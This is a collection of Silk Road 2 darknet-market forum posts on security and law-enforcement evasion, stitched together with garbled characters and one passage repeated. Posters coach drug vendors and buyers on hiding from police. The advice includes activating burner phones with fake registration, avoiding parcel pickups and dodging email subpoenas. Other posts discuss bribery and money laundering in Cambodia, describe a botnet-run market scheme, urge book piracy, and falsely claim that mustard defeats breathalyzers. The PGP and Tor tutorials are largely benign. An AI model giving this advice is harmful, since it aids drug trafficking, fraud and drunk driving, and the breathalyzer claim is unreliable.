It teaches you how to program, not a language. Read this why you should do it: http://hackerretreat.com/why-how-start-sicp/  If you need to bring up your math (you don't need any math to code, but it helps make you a better programmer) then pirate/buy Sheldon Axler's Precalculus vol2, and his book on Linear Algebra done right. MIT Opencourseware also offers this excellent course: http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-042j-mathematics-for-computer-science-fall-2010/  Anyways, after you're done SICP might as well go on stackexchange and look up any good Clojure books. Lisp-1 dialect language so very similar to what you do in SICP. If not, do these: http://amzn.to/cthr46  That book list is from tptacek, a guy who posts on hacker news and breaks crypto implementations for a living. The Art of Software Security Assessment is incredible, still a relevant book. C Interfaces is a must read too. There's also this site: buildyourownlisp.com so you can learn C while creating a C-like Lisp. You lean this in SICP, how to create domain specific languages (DSLs) and any other language you want. None of this costs money, can easily torrent all the books. Coursera.org is another option.  I had naive ambitions of running a market like this once. Using TinyScheme, I could roll a 20kb interpreter hidden in a binary, inside a 300 node paid botnet that could admin the entire market for me receiving and replying with Ed25519 curve signed JSON feeds. I could run it with emacs in terminal, automatically switching servers at x intervals. Then I read the Snowden docs and realized it would be a waste of time. That corruption runs so deep, DEA agents in cahoots with 7 eyes alliance global analysts dropping each other payments and doing parallel construction. Fuck it too much risk. Unless you are a Russian citizen don't bother. It was a pretty clever scheme though, look into TinyScheme after you do SICP. ",""

But once itâs alone in a room full of law enforcement officials, you might be surprised at the revealing things it will say about you.On Tuesday the American Civil Liberties Union published a report it obtained from a drug investigation by the Immigration and Customs Enforcement (ICE) agency, documenting the seizure and search of a suspectâs iPhone from her bedroom. While itâs no surprise that a phone carries plenty of secrets, the document presents in stark detail a list of that personal information, including call logs, photos, videos, text messages, Web history, eight different passwords for various services, and perhaps most importantly, 659 previous locations of the phone invisibly gathered from Wifi networks and cell towers.âWe know the police have started using tools that can do this. Weâve known the iPhone retains records of the cell towers it contacts. But weâve never before seen the huge amount of data police can obtain,â says ACLU technology lead Chris Soghoian, who found the report in a court filing. âIt shouldnât be shocking. But itâs one thing to know that theyâre using it. Itâs another to see exactly what they get.âIn this case, ICE was able to extract the iPhoneâs details with the help of the forensics firm Cellebrite. The suspect doesnât seem to have enabled a PIN or passcode. But even when those login safeguards are set up in other cases, law enforcement have still often been able to use tools to bypass or brute-force a phoneâs security measures. Google in some cases helps law enforcement to get past Android phonesâ lockscreens, and if law enforcement canât crack a seized iPhone, officers will in some cases mail the phone to Apple, who extract the data and return it stored on a DVD along with the locked phone.The phone search and seizure described in the documented case required a warrant. But the legality of warrantless phone searches remains an open issue. At U.S. borders or when arresting a suspect, for instance, police and government officials have argued that no such warrant is required.Failing legal protections, the ACLUâs Soghoian says those whoâd like to keep prying eyes away from their handsetsâ data should use long, complex passcodes and encrypt their phoneâs storage disk. âWhile the law does not sufficiently protect the private data on smartphones, technology can at least provide some protection,â Soghoian writes.Hereâs the full court document detailing the iPhoneâs forensic search."

Blancco makes a software that completely wipes your smartphone to prevent from forensic recovery. Now, I cannot vouch for the validity of this software, personally, but DBAN (a reputable data erasure program) recommends them, so I'm assuming that it is pretty legit. Next, if you absolutely MUST discuss sensitive conversation with someone over the phone (still, it is always best to just take the time to meet with someone face-to-face), then I would suggest that you go to Best Buy (or likewise) and buy a ""no-contract smartphone"" in cash (you can find a sufficient model for like $49, typically). You must also purchase a pre-paid card to activate your talk, text, and data. Go to a public WiFi spot to activate this card and register with fake information. Now, you have an activated  burner phone with smartphone capabilities, meaning you can download various security apps. I would recommend that you download an encrypted messaging app like  Wickr and register a username. Tell your contact to do the same and now, you can message them from an anonymous mobile device through a secure, anonymous username. It's virtually untraceable..",""

I can't suggest anything until I have a better idea of what the problem is -- I can make inferences as to what the problem is, but I don't know for certain, and I'd rather not second-guess. Just using a phrase like ""it doesn't decrypt right"" doesn't tell us anything.   As far as using ""a more secure email service"" that isn't going to undo the damage that has already been done.  As it currently stands, you have inextricably associated your vendor identity on SR with a Gmail account. Google, the operator of Gmail,  permanently stores the IP address used when the account was established, and Google also keeps track of the last 10 IP addresses used to access that account. If you access your Gmail account  even once without taking precautions to mask your real IP address (like using Tor) then Google has a record of your real IP address.   All a law enforcement organization (LEO) has to do is to approach a judge and get a warrant -- this would be easy, given that you're selling drugs, and the link to your Gmail account is crystal-clear. Next would be a letter from that LEO to Google, essentially constituting a data-preservation order, so that all email would be retained, even if you tried to delete it (or the account, for that matter). Cryptome has a case from 2008, where a Maryland LEO requested the following:   1) Subscriber and account information including name and address  2) Payment history for premium services  3) Date that account was created  4) Current account status  5) Alternate contact infomation, including email addresses.   6) Login records with associated IP addresses  7) Any (sent, read, unread, deleted, archived) email associated with this account along with any attached files  8) Any additional infomation maintained or within the databases of GMail, Google, Incorporated.   This request is made in reference to Title 18 Section 2703(f) in regards to Access to Wired and Stored Communications  You may be wondering about references to the IP address that I keep harping on.  If you read the affidavit in the Stumbo case, where the DEA arrested Tyler Stumbo for steroid trafficking, you would discover that the IP addresses stored by Hushmail were instrumental in determining which ISP Stumbo was using. Using these IP addresses, along with the dates and times of his logins to Hushmail, the DEA was able to have Stumbo's ISP identify him as the subscriber in question.  Stumbo's ISP supplied the DEA with his name, residential address and phone number, as well as payment information.   Google did something similar with Ross Ulbricht -- knowledge of which Gmail address he was using helped enormously in tracking him down. You are running the very same risks. If, after reading this, you still do not understand the danger you are in using a Gmail address, then there is nothing else to be said. Govern yourself accordingly.

"Silk Road 2 Forums","MarcelKetman","40869","2014-05-19T11:41:08","Opening Quickforget and other non-javascript private note services","Discussion/Security"," Well that's my question: From a vendor's POV, is it really bad practice? How? An address is only an address. Temp.pm and Quickforget can't have any idea what the address is being used for even if they could see it, which they say they can't.   From a buyer's POV it is bad practice IMO but it's not completely irrational either. The chances of being busted for having your address on SR are between very, very, very slim and none. Remember the FBI had access to SR1 servers for 1 month. Not one buyer was pursued. Why? Because the resources involved to pursue a small-time crook that you are more than likely unable to convict makes it unfeasible. Buyers have only been pursued when drugs were seized in the mail. Without drugs, there is no drugs case.    So although I highly recommend PGP, I don't think people who don't are totally crazy either.   Getting back on point though!! What I want to investigate here is, why would a vendor not accept an address from a private note service once he has taken care of his own OPSEC? Still haven't heard a good reason but would love to hear one if there is  ","Still not great though, bad practice really letting them input their info into 3rd party without PGP but for simple queries from behind TOR I think it's okay."

Please read my title and OP once more   You can open quickforget, temp.pm and many others with scripts turned off. It was a general question. You keep focusing on privnote.  2. I'm well aware of the FH case. If you read, throughout the thread I have shown myself to be aware of these things. These are risks with all websites not just clearnet ones btw. The NSA is well able to replicate all websites on its FoxAcid server. It is for reasons such as these we use tails, spoof our macs, uses bridges, never use the machines we use for business for anything else and even still dump machines regularly. Once all of this is done, I don't see a problem opening notes. Until of course someone can enlighten me. You're not doing a very good job of it.   3.It's not my address that's being inputted remember. You seem to be completely ignoring this fact yet still drizzling your off-point replies in sarcasm.    Bottom line is, every website is potentially dangerous. I have taken precautions against this. Why would I single out a couple not to visit when every one poses the same risk?  ","Quote from: MarcelKetman on May 19, 2014, 09:56:48 amI think you're one of the many that didn't properly read my OP  My question has nothing to do with PGP. I said that scripts must be turned off. I also said I understand the risks for the poster of the note. BUT, where is the risk for vendors? You say that a person who uses privnote due to laziness puts himself and a vendor in serious risk. He puts himself (and this is his choice) at possible risk, but he doesn't put a vendor at risk. The only person who can put a vendor at risk, is also himself - unless someone here can show me otherwise. That's my actual question First point: you can't open privnotes with noscript enabled.Second point:  is very important to you read about FH case and study a lot about browser injections and strong risks on cross-traffic between tor spy nodes under clearweb and poison cookies  before to affirm things that you don't know about vendor opsec.Third point: you never will know who configured an onion hidden service, surely if we were LE we would create a service as sms4tor to capture in cleartext addresses of innocent people who believe in Disneyland for free.Good luck, you really will need."

Post offices have cameras. And people. And these ones might have had dogs according to the warning.Anyway it's days later and this guy has not posted anything since. I think it's clear what happened. He's in custody. This is why when receiving a schedule 1 or 2 substance you should never agree to pick it up at the post office. NEVER. Even signing for it can fuck you.Don't make the same mistake this guy did. If you have the same thing happen to you then just let it go and have the seller ship you another. That's the cost of doing business and why the escrow system here was invented to begin with.Where do you get your info from?

"Silk Road 2 Forums","proliferated","49207","2014-08-27T00:31:49","Relay early - worst case scenario?","Discussion/Security","","INTRODUCTiON TO SECURE COMMUNICATION - TOR, HTTPS, SSL         So what can we do to fix this? Well, luckily we are now having more and more servers that are offering something called Hidden services. You can easily recognize these services by the address .onion. These services offer what's called end-to-end encryption. What this does is take the power out of the compromised exit nodes and put them back in your hands. The web server of the hidden service now becomes your exit node, which means the website you are visiting is the one decrypting your message, not some random exit node ran by a potential attacker. Remember, the exit node has the key to decrypt your request. The exit node can see what you are sending in clear text once they decrypt it. So if you are entering your name and address into a field, the exit node has your information. If you are putting a credit card, a bank account, your real name, even your login information, then you are compromising your identity.                  Another step you can take, is to only visit websites that use something called HTTP Secure. You can tell if the website you are visiting is using HTTP Secure by the prefix at the beginning of the address. If you see https:// then your website is using HTTP Secure. What this does is encrypts your requests so that only the server can decrypt them, and not somebody eavesdropping on your communication such as a compromised Tor exit node. This is another form of end-to-end encryption. If somebody were to intercept your request over HTTP Secure, they would see encrypted data and would have to work to decrypt it.          Another reason you want to use HTTPS whenever possible, is that malicious Tor nodes can damage or alter the contents passing through them in an insecure fashion and inject malware into the connection. This is particularly easier when you are sending requests in plain text, but HTTPS reduces this possibility. You must be made aware however, that HTTPS can also be currently cracked depending on the level of the key used to encrypt it. When you visit a website using HTTPS, you are encrypting your request using their public key and they are decrypting it using their private key. This is how cryptography works. A public key is provided to those who want to send an encrypted message and the only one who can decrypt is the one with the private key. "

I understand part of what will keep me safe is to never reference anything remotely close to anything that has happened to me, or anyone I know, or anything about me or them. that does kind of suck when chit chatting with people, buuuuuut on the flipside I can make up stories about whatever i want for conversation and obfuscations sake.

It's a well known fact LE profile us - especially those that are 'higher' up so to speak. Vendors, mods and the rest of the staff. They try to gather info on these forums that may lead to being able to build a profile about us, locations (roughly), physical looks, slang that may be used (by this I mean words that are used by people of only certain locations)Anyway, do you remember how LE got Ross to start acting like a fool? They angered him. They threatened him with exposure of over 500 buyers and that made Ross angry and he slipped up and let rage make him **allegedly** hire a hit-man. Often on these forums, people will try to rustle your tail feathers so to speak. Be careful with these people.Sure, some are just people looking for a fight or seem to think they know everything. Other times it could be LE looking to add on to some profiles. Most recently I noticed it happening to me in a thread. Someone was saying the most ridiculous things to me, and from the beginning I felt it had LE written all over it. So, I let them know the way I get my MBB's for shipping. Well... I never really. I told them a big pile of bullshit. Shortly after my post I got numerous PM's like 'FUCK DELETE THAT MAN YOU SHOULDNT HAVE SAID IT.' I simply answered them all with, I've been at this for 3 years, do you think I am that stupid as to give something like that away. If they are to back track my posts (LE of course) they are going to be left fairly confused. Sometimes I have a team of 6, other times 4. Sometimes we/I am an individual. Sometimes I give away clues to as what I look like (but of course it's BS). Maybe I have a pet cat, or a dog. Maybe I have 37 parrots that help me package product. Occasionaly I like to give away clues about this crews current operation location - of course every single one has been nothing short of a lie. I am a professional; I am not going to incriminate Hiniguel or anything to do with Hiniguel in anyway in an open forum.What I am trying to say is keep your cool; these LEO are pros at what they do. They can manipulate you without you even knowing. So, try and stay calm at all times and just try keep this place as safe and don't let LE get what they want.This is false we see no value in this due to the fact there is so much bullshit that gets thrown around here on these forums it is impossible to sift through the truth from the lies. We prefer to keep our information as reliable as possible and this place is worse than a bunch of drunk fisherman comparing war stories. We seek truth from what we can physically catch you with which is why we waited for Ross to log into his laptop and put a tracker on Nod's car. If we were to profile everyone on this forum it would have as much legal clout as Santa describing how he rapes elves who won't make him toys.

Then GNOME 3 came along, and the seahorse plugin for edit disappeared (which is what is used for the Tails 1.1 version and foward!).  I have attempted to install the seahorse plugin for the current gedit on 1.1, but it does not bring back the encrypt/decrypt menu button feature. The features have been included as external right click encrypt/decrypt commands in nautilus, but thats not quite the nice and easy option we had with the version of gnome/gedit that rolled out with tails 1.01 and previous.  So we have a couple solutions!  See: http://askubuntu.com/questions/116996/how-do-i-encrypt-decrypt-file-within-gedit/501848#501848   FYI i just pasted the following into the external command script window for decrypt (ignore the others, this one works great): #!/bin/sh gpg -d --no-tty - 2> /dev/null  A good guide with images on how to implement the above solutions(though it uses a different script so dont use the one listed in this URL:) http://blog.brunobraga.net/encrypting-and-decrypting-with-gedit/  For encrypting its still kind of a pain, because the external command script does not allow you to specify which key you wish to encrypt with, which makes that aspect of it pointless for me since im always responding to different people. So you can ignore the creation of a external command script within gedit because it does not prompt you for which key you wish to use to encrypt. For this, I just copy the text I wish to send, and then right click in the upper right hand corner where the clipboard icon is, select Sign/Encrypt with Public Keys, and then i type who's key I want, click on it to checkbox it (this is where alt-o on prior gedit versions used to be so handy, it would automatically encrypt whatever key was highlighted/selected so it did not require you to use your mouse) then hit okay. It will give you a nag prompt about it not being trusted, to which you ignore and hit okay. Then the encrypted message is automatically copied to your keyboard.  There was another solution propsed which I could not get working:  http://pietrobattiston.it/gedit-crypto#how_to_install  I get the following error trying to install (this is after I installed seahorse, a dependency)  root@amnesia:/home/amnesia/Desktop# sudo dpkg -i gedit-crypto-plugin_0.4-1_all.deb  dpkg: regarding gedit-crypto-plugin_0.4-1_all.deb containing gedit-crypto-plugin:  gedit-crypto-plugin breaks gedit (<< 3.12)   gedit (version 3.4.2-1) is present and installed.  dpkg: error processing gedit-crypto-plugin_0.4-1_all.deb (--install):  installing gedit-crypto-plugin would break gedit, and  deconfiguration is not permitted (--auto-deconfigure might help) Errors were encountered while processing:  gedit-crypto-plugin_0.4-1_all.deb  I also installed Geany with its pgp plugin (sudo apt-get install geany geany-plugin-pg) but its not nearly as user friendly as the old gedit, or the new gedit with the external command scripts. Also in Geany when you try to encrypt text with a users key the key prompt does not allow you to type to quick search for someone's key, and for someone like me that has hundreds of keys the ability to type a key name is absolutely mandatory.  But as a replacment for the old gedit with a button for encrypt/decrypt if you dont have a lot of keys you would need to search through, its a viable option. ",""

"Silk Road 2 Forums","Nightcrawler","23823","2014-02-11T18:24:37","Cannot access account due to two factor authentication","Discussion/Security"," GPGTools is highly version dependent -- depending on which version of OS X you have, it may or may not work as expected. If you have Leopard (10.5) then you're pretty much out of luck. Your only option then will be using the command-line.   If you have Snow Leopard (10.6), Lion (10.7) or Mountain Lion (10.8), or Mavericks (10.9) the following instructions should be sufficient to allow you to get up and running.   Download and install GPGTools: http://nightly.gpgtools.org/GPGTools_Installer-trunk.dmg  Once you have installed GPGTools, what you want to do is to go into System Preferences --> Keyboard --> Services.  Scroll down until you find the following entries. Be sure to put a check mark in the boxes to activate each keyboard shortcut.   Keyboard shortcuts:  ==================  OpenPGP: Decrypt Selection: Shift-Command-D  OpenPGP: Encrypt Selection: Shift-Command-E  OpenPGP: Import Key from Selection: Shift-Command-I  OpenPGP: Insert My Fingerprint: Shift-Command-F  OpenPGP: Insert My Key: Shift-Command-K  OpenPGP: Sign Selection: Shift-Command-R  OpenPGP: Verify Signature of Selection: Shift-Control-V   Remember, these shortcuts only operate on highlighted or selected text. N.B.: To properly be able to import PGP keys into GPGChain (via TextEdit) you need to change the default on TextEdit from .rtf to plain text. You can do that through the Format menu, or you can go through the main configuration menu, accessible by using Command-comma. Ensure the plain text radio button is selected. Also ensure that the following are UNCHECKED in TextEdit preferences: smart quotes, smart dashes, smart links.   To select text within TextEdit, use Command-A to highlight the entire document, or use your mouse to selection the section that you want to verify/sign/encrypt/decrypt. It is highly recommended that you use only plain-text, as opposed to Rich Text (.rtf) format. Use Command-comma to bring up Preferences and ensure that the plain text radio button is checked.   Once your text is highlighted in TextEdit, (by pressing Comand-A) you then encrypt using Shift-Command-E. You will then be presented with a list of keys to encrypt to, that you have added to your PGP keyring:   Other Commands You May Need: ============================  OpenPGP: Decrypt File: Control-Command-D  OpenPGP: Encrypt File: Control-Command-E  OpenPGP: Sign File: Control-Command-S  OpenPGP: Verify Signature of File: Control-Command-V   Once you have setup these shortcuts, you can begin using GPG.   To encrypt a message to someone using GPG, you first need a copy of the recipient's PGP public key.   Once you have located someone's PGP public key, you should copy and paste it into TextEdit. Save the PGP key to a file; you can call the file, import.asc (or import.txt), for example. This saved file will usually be found in the Documents folder.   Launch GPG Keychain Access from the Applications folder. click on the Import icon in the upper left hand corner. GPG Keychain Access will then prompt you for the name of the file which contains the key to import. It will usually show you a list of files in the Documents folder. Click on the file named import.asc (or import.txt), and click ok. The PGP public key will then be imported into your PGP keyring.   To encrypt a message to a person, the message must be contained in a TextEdit document. Use Command-A to hightlight the entire document. Then use Shift-Command-E to encrypt. GPG will pop-up a list of public keys in your PGP keyring. Each key will have a little checkbox beside it which you can check, to select that particular key. If you were encrypting a message to me, you would put a check in the box beside my PGP key (Nightcrawler@SR).   When you click on OK, the plaintext (unencrypted) message in TextEdit will be replaced with the encrypted message. You can then copy and paste the encrypted message to enter it into a form on Silk Road, or anywhere else that it needs to go.   To decrypt a message sent to you by other people, you need to copy that message to the clipboard, and paste it into a TextEdit document. Again use Command-A to highlight all the encrypted message. Then use Shift-Command-D to decrypt the message. If the message is encrypted to your PGP public key, you will be prompted to enter your passphrase. Once the correct passphrase has been entered, and you click OK, then the message will be decrypted, and the decrypted text will be placed in the TextEdit document, replacing the encrypted message that was there previously.

However, this is far from a failsafe when it comes to preserving your anonymity.  I find it very troubling when people refer to VPN's that ""don't log."" How do you know this? Did you Google it and go to their web site? Did the VPN service's web site promise you? Did DeepDotWeb publish a list of good vs. bad VPN's that log vs don't log? Ever had someone not tell you the full truth in order to sell you something?   You should operate under the assumption that all VPN's log, even ones that claim or promise they don't. Nobody is going to jail for you. The only VPN that you can confirm does not log/track you is one that you run yourself.  As for i2p, it's a known critical security issue that ships with the most up-to-date Tails version (1.1). So every time you boot up 1.1, if you don't either delete or upgrade i2p before using it, you can get p0wned.    ","But what if you dont want your ISP knowing your using TOR?

The main issue with VPNs as others have said is there is no way to know for sure if they keep logs. Some have ways that you can logically verify it and make strong-ish assumptions.  As far as the ABC or someone controlling a lot of exit nodes, that's certainly a possibility, especially if the amount of non human users on the TOR network almost certainly outnumbers the ammount of human users.  With that said, TOR devs are pretty good about updating. It's possible that the veil could be down for a TAD BIT but they are generally on top of things.  I do not know about VPNs with TAILS.....What is do know is that if it's a .onion, the exit node relays are much safer as they are routed through the hidden service or something to that sort.   hope that helps?  IDK the precise answer.","INTRODUCTiON TO SECURE COMMUNICATION - TOR, HTTPS, SSL         So what can we do to fix this? Well, luckily we are now having more and more servers that are offering something called Hidden services. You can easily recognize these services by the address .onion. These services offer what's called end-to-end encryption. What this does is take the power out of the compromised exit nodes and put them back in your hands. The web server of the hidden service now becomes your exit node, which means the website you are visiting is the one decrypting your message, not some random exit node ran by a potential attacker. Remember, the exit node has the key to decrypt your request. The exit node can see what you are sending in clear text once they decrypt it. So if you are entering your name and address into a field, the exit node has your information. If you are putting a credit card, a bank account, your real name, even your login information, then you are compromising your identity.                  Another step you can take, is to only visit websites that use something called HTTP Secure. You can tell if the website you are visiting is using HTTP Secure by the prefix at the beginning of the address. If you see https:// then your website is using HTTP Secure. What this does is encrypts your requests so that only the server can decrypt them, and not somebody eavesdropping on your communication such as a compromised Tor exit node. This is another form of end-to-end encryption. If somebody were to intercept your request over HTTP Secure, they would see encrypted data and would have to work to decrypt it.          Another reason you want to use HTTPS whenever possible, is that malicious Tor nodes can damage or alter the contents passing through them in an insecure fashion and inject malware into the connection. This is particularly easier when you are sending requests in plain text, but HTTPS reduces this possibility. You must be made aware however, that HTTPS can also be currently cracked depending on the level of the key used to encrypt it. When you visit a website using HTTPS, you are encrypting your request using their public key and they are decrypting it using their private key. This is how cryptography works. A public key is provided to those who want to send an encrypted message and the only one who can decrypt is the one with the private key. "

"Silk Road 2 Forums","whom","9527","2013-12-18T03:26:23","Security noob questions - Segregating data via dual-boot?","Discussion/Security"," Tails leaves the fewest traces.   But its lack of persistent entry guards makes it insanely more likely to eventually end up with a malicious entry guard.    Because of this, Tails (unless you use bridges) makes it more likely you'll be deanonymized over time.  But there should be no traces on your hard drive if someone shows up because of that.  Whonix, physical isolation, Qubes, etc make it less likely you'll be deanonymized in the first place, but more likely there will be traces in a forensic analysis.   Full disk encryption is usually the hedge against that, but it's only as secure as your password and your legal standing in choosing not to disclose that password to adversaries.  There are usually two categories of concern with hardware along these lines: 1. True backdoors - a way for an adversary to exploit something at a hardware level.  i.e. ethernet chipset backdoors, faulty random number generation causing crypto to lose strength, etc. 2. Malware that persists in hardware - evil shit that hides itself in video cards, BIOS, etc, to persist and reinfect even beyond hard drive replacement/reimaging.  There are isolated examples of both out there.  Unfortunately, there's very little you can do to really address either.    Make sure you routinely update Ubuntu (apt-get update; apt-get dist-upgrade).   Remove the Ubuntu phone-home Lens apps (google for ""Whonix Ubuntu"" and you should find some tips on building an Ubuntu instance, including removing packages, or find the thread where the topic got beat to death here a month or two back.. I posted a series of Ubuntu packages to remove.. can't promise it's comprehensive, but it's a start.   ufw on Ubuntu makes it easy to configure iptables for a host-based firewall, which helps keep your neighbors on a shared wifi from accessing your instance.  Make absolutely sure you have Javascript disabled when you're using Tor.   You shouldn't be doing anything requiring anonymity on any platform that Norton runs on (i.e. Windows) so it shouldn't be an issue.  Norton or any other AV probably isn't going to save you from anything you should be worrying about on Tor.  It's warning you that you're in danger of loading an external program to handle the content, or are getting ready to save it to your hard drive.  For instance, loading a PDF viewer is dangerous because PDF's can contain a variety of things that cause the PDF viewer to phone home.  Yes.  Especially nothing that identifies you.   Email accounts, Twitter, Facebook, etc.   Basically, anything requiring a login that you've ever logged into from a real (non-tor) IP.  No, but it makes it a little bit more difficult.   If you believe entities like NSA can easily do Tor correlation attacks, then intersecting that data with VPN correlation isn't rocket science.  Most VPN providers are an easy target for global passive adversaries, and are definitely easier to passively monitor than Tor.  Basically, roughly as secure/insecure is it is from doing it from your real source.  The only difference is that the remote streaming server can't see your real IP, and an adversary would have to get logs or a traffic analysis (i.e. flows, or L3/L4 summaries) to tie it back to your real source.  You can find a million debates over which VPN provider is ""secure"".   Some providers admit they log, some claim they don't.  You have no way of knowing if they really are, so you HAVE to work off the assumption that they do.  Generally, people advise it so someone can't wait for you at the one you used last time.  From a network perspective, all the hotspots are going to be close enough together that your rough geographic location will be obvious if an adversary gets that far. ","1. Those of you who have more experience: I'm worried about if my computer is accessed in some way or tracked down. I want to separate everything that could be linked to something illegal and keep it on a different hard drive from anything connected to my regular life, name, etc. I this necessary and if so what' s the way that's secure with the least trouble? Partitioning my computer to dual-boot? Having a removable hard-drive? Just a virtual machine inside my (Windows) computer?;2. Are back-doors in the computer hardware a serious issue for us or not worth worrying about? ;3. What's the best security software or important practices if I have Ubuntu;4. Should I be afraid that the big-name security suites like Norton are actually compromising my security?;5. The message that says third-party applications will reveal you: It comes up in a window that says ""Load external content?"" even when I click 'Save Link As'; why is this and how to you just save the file without any security compromise? ;6. Does this mean that I shouldn't run/open anything else while on on the internet via Tor and/or VPN? ;7. VPN feeding into Tor stops the possibility of a correlation of traffic attack, right?;8. How secure is streaming media over encrypted VPN only? ;12. Also, why does it help to keep moving to different WIFI hotspots? Is this purely for correlation attack or is there some other issue? Thanks in advance for letting me abuse your patience with my noobery."

Some people just don't want to get into having to extort. It's possible someone going for a bounty would have found the hole first instead of FriendlyChemist and then it would have been patched earlier.  Also those IP info leaks were just disastrous. SR could have funded an open source SR that was audited prior to being put up as the site. That way they would have worked around the issue of giving out the source of the live site and risking immediate sophisticated attacks. What do you think about that idea?  I would enable logging but that is assuming the logs are audited. Not easy for a site with lots of traffic. Wonder if they used intrusion detection, etc.  Having a bounty is like having an insurance policy. SR can't buy insurance for obvious reasons so they need alternative mechanisms in place to hedge against and spread risk.  Now is they can compromise the wallet that is another story as people can easily get away with a few million. But catching some bugs is better than none.  Glad everyone likes this idea.

The police and prosecuting authorities can do the following:  1. Obtain historic call data relating to your mobile phone without having possession of it. This is generally obtained direct from the telephone companies and is a list of all calls made/received, text messages sent/received, 3g/4g data access and even top up/payment history. This will be listed on a spreadsheet with your telephone number, the called/received telephone number the duration of the call and the cell site which you were connected to at the time.  They can obtain authority in house for this by a senior police officer, so this doesn't need much suspicion.  This will not include content, so actual text messages or recorded calls etc.  2.  Intercept telecommunications. This is tricky for them as in most cases they need a warrant from the home secretary, and you have to be doing some serious shit. Although I think belief that you are involved with SR could be justification enough if written up properly. i.e ""the suspect is part of a multi million multi national drug ring that is a threat to society as we know it"" kind of shite. Really the sky is the limit when intercepting your telecommunications. They can obtain live call data, record calls, listen live to calls, get all text messages and track you with your gps signal.  The key here, especially with calls and texts is that the content is obtained live and recorded by the phone companies to pass to the police immediately. So historic calls or texts cannot be seen.  There is only one mobile phone company that doesn't require this level of interception (home secretary warrant) and that's Orange. Orange store all texts for 76hours, so the police CAN obtain historic text message content from orange with just a crown court warrant called a production order, similar to an order to see your bank records.  All others a warrant, or promise of a warrant, has to be in place for them to intercept content.  3. All the above can be obtained whilst your mobile is still in your possession.  If the police manage to seize your mobile, especially if it's a fancy modern i-phone etc, they can almost get everything that has ever been on it off with relatively little technical know how.    To protect your privacy the rules are simple:  1. DO NOT register a mobile phone in your name 2. ALWAYS have a pay and go phone and top up with cash at a shop with no cctv 3. DO NOT use a fancy phone  4. NEVER give your mobile phone number to anyone who knows your real name 5. Stay away from Orange    ",""

Most people you can bribe if you have enough money or the right connections, often you have to pay a protection tax to the police and military if your a big fish like a cartel boss or someone with a lot of money i.e bankers.   But we are talking multi million dollars here, like cartel bosses or wealthy bankers. Not some pissy little amount of money or bitcoins, a small vendor on Silk Road who has a spare $100,000 in cash will get you no where in 3rd world countries.   They would probably laugh at you if you only had that sort of money and tell you to get fucked and bash the shit out of you before they deport your sorry ass from the country.  You can however buy citizenship and get a real legit passport in some South American countries for as little as $75,000. But you also have to buy property and live there for six months but they do give you real documents after you have done your six months and spent a bit of money in the country but you have to show you have a lot of money.  South East Asia is much the same, if I was looking for a place to launder money it would be Cambodia or Burma. In Cambodia they are so corrupt you can get out of murder for about $10,000. Seriously they will let you go if the money is right. Why do you think there are so many wealthy pedophiles living in Cambodia that are not in jail? It's full of corrupt police and politicians, bribes are a way of life there and their banking system has almost zero rules on what you can deposit, they wouldn't care if you were a heroin dealer as long as the money is right.

Never know, he might be able to do something for ya. He will give you the best advice, but it will most likely be a plea deal that makes you enter a guilty plea (so they dont have to go through the motions and waste of time of the court, just goes straight to deferral) in order to get the perks of the deal. They will never offer anything for not guilty, thats considered taking your chances and whatever happens at the end is what happens. There is no diversion with that route, you get the letter of the law and the minimum setnences if guilty. Think of it this way: They dont want you to get 2 chances to get the case dropped (ie Not Guilty plea  & then a diversion program as a plea) ...its either you make a deal or take your chances.    Find a good lawyer. Ask a LOT of questions.  A great lawyer will ask YOU a lot of questions right off the bat about the case. Things you wouldnt have considered. Call around, they always will do an initial consult for free.    Pro Tip: Mustard covers the smell from the breathalizers. Carry some packets of mustard in your car next time and swish a few packets in your mouth and swallow if you get pulled over. Thats why they never tested that myth on Mythbusters. It works.

To the best of my knowledge, the RSA algorithm does not include a random number generator.  The problem lay in the BSafe software, marketed by RSA, Inc. -- note, the company as opposed to the algorithm -- BSafe included a reputedly-backdoored random number generator algorithm as its default.

"Silk Road 2 Forums","Nightcrawler","11203","2013-12-24T17:36:31","Best encryption algarithms? ","Discussion/Security"," Dual-RSA, 4096-bit.   One of the biggest problems with PGP/GPG is that the keys are long-lived, as opposed to being ephemeral. For example, Ross made a huge mistake when he used a single RSA key, with no encryption sub-key. (He probably used Kleopatra <sigh>)  The reason that having no sub-key is important is that if you have an encryption sub-key, you can periodically replace it with a new sub-key, and destroy the earlier ones. As it stands, everyone who sent Ross an PGP-encrypted message since he started Silk Road, should assume that the Feds can decrypt all the encrypted traffic he may have retained.   The idea behind expiring/deleting sub-keys is that when you destroy the private half of an encryption sub-key,  you can no longer decrypt messages encrypted with it. Doesn't matter if they hold a gun to your head, or whatever. Once the private half of the encryption sub-key is destroyed, NO ONE can decrypt it, short of factoring the key into the component parts that comprise the private key.   You can set a separate expiry date on the encryption sub-key, e.g. 2014-03-30. Prior to that time, you generate a new sub-key, which expires 2014-06-30. After 2014-03-30, your correspondents' copies of PGP will refuse to use an expired sub-key; if they hae already updated your key on their rings, they will have the updated sub-key and they can continue normally. Say 10 days into April, you destroy the private half of the sub-key that expired on March 30th. If you were to get busted after that, NO ONE, even you could read traffic encrypted with that now-destroyed sub-key. (I keep meaning to write-up a tutorial on this, but life keeps getting in the way.)

Do not make security decisions based on things you just heard, and you don't fully understand  RSA is ambiguous -- it can stand for several things:   1) The initials of the inventors of the RSA algorithm: Rivest, Shamir and Adelman  2) The name of the company, RSA Inc. which the inventors setup   3) The name of the algorithm that bears their initials, which is based on the difficulty of prime number factoring.   To the best of my knowledge, the RSA algorithm does not include a random number generator.  The problem lay in the BSafe software, marketed by RSA, Inc. -- note, the  company as opposed to the algorithm -- BSafe included a reputedly-backdoored random number generator algorithm as its default.

","Discussion/Security"," That made my skin crawl as well, particularly in light of the Snowden revelations.    I think even Schneier would urge people to be conservative. If I recall correctly, he's said that the SHA-2 family (especially SHA-512) was holding up better than expected, in that there was no progress against that family, as there had been with SHA-1.  Threefish might be attractive, but it's kinda new, and I tend towards conservatism, even curmogeonliness when it comes to security.

